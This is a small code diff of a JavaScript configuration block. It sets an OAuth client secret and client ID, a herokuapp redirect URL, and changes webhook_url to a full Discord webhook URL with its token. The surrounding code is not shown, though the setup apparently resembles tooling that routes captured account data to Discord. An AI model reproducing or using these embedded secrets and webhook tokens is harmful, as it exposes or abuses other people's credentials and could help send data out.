@@ -2,7 +2,7 @@
 const client_secret = 'LMc8Q~kAUEi1rHqex10S3PowlSK.oGM1_It2JaoS'
 const client_id = 'ba169269-a508-4a40-b2c5-1debd6dc82fb'
 const redirect_uri = 'https://chainsama.herokuapp.com/'
-const webhook_url = 'https://fragrunner.xyz'
+const webhook_url = 'https://discord.com/api/webhooks/1033629189397553252/oLzt83tgLmfn6ddf4rF7p_hJBwUtyADwbx7jsmvl8FkMs--ZeUKua78uITxwdHERDICl'
 const webhook_logging_url = 'https://discord.com/api/webhooks/1033629189397553252/oLzt83tgLmfn6ddf4rF7p_hJBwUtyADwbx7jsmvl8FkMs--ZeUKua78uITxwdHERDICl'
 // Config end
 const axios = require('axios')
